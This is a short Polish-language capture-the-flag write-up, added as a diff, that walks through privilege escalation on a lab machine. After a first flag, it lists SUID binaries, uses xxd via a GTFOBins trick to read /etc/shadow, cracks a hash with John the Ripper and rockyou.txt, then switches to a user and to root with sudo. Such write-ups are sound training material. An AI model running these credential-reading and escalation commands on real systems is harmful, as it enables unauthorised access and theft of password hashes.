@@ -1,0 +1,19 @@
+Mamy shell i udaje nam się tym sposobem zdobyć pierwszą flagę, teraz musimy pomyślec jak możemy powiekszyć nasze uprawnienia do roota ponieważ jesteśmy najmniej uprawnionym użytkownikiem
+
+Wpisujemy zatem komendę wyszukującą pliki SUID:
+find / -perm -u=s 2>/dev/null
+
+Naszym oczom ukazuje się /usr/bin/xxd
+
+Jak wiemy z gtfobins, dzięki temu możemy czytać pliki które wymagają wyższych uprawnień, możemy więc w takim razie odczytać /etc/shadow:
+LFILE=file_to_read 
+xxd "$LFILE" | xxd -r  
+
+Udało się, crackujemy hash za pomocą johna i rockyou.txt
+john pass.txt w=rockyou.txt 
+
+Logujemy się do konta użytkownika (ma on wszystkie uprawnienia):
+su vianka
+
+Kiedy jesteśmy na jej koncie korzystamy z tego że ma wszystkie uprawnienia i logujemy się do roota:
+sudo su 
